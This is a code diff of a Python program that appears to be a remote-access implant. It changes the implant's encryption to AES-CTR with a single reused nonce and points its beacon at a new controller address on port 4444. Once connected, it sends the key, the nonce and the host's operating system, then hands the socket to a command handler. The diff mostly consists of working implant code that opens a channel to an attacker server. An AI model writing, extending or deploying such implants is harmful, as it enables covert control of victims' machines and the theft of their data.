@@ -4,20 +4,25 @@ import time
 import socket
 import ctypes
 import subprocess
-from cryptography.fernet import Fernet
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
 import platform
 
 
 
 # ------------------ Encryption ------------------
 
-key = Fernet.generate_key()
-cipher = Fernet(key)
+# Generate a random 256-bit key
+key = get_random_bytes(32)
+# Generate a random 96-bit nonce
+nonce = get_random_bytes(12)
 
 def encrypt(data: bytes) -> bytes:
+    cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
     return cipher.encrypt(data)
 
 def decrypt(data: bytes) -> bytes:
+    cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
     return cipher.decrypt(data)
 
 def to_chunks(data: bytes, chunk_size: int = 1024):
@@ -627,10 +632,12 @@ def Connect_to_server():
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
             while 1:
                 try:
-                    sock.connect(("192.168.50.178",4444))
+                    sock.connect(("192.168.50.200",4444))
                     print("[*] Connected to server ...    ")
                     time.sleep(1)
-                    sock.sendall(key)
+                    sock.sendall(key)  # Send 256-bit key
+                    time.sleep(1)
+                    sock.sendall(nonce)  # Send 96-bit nonce
                     time.sleep(1)
                     sock.sendall(operating_system.encode())
                     client = ClientHandler(sock)
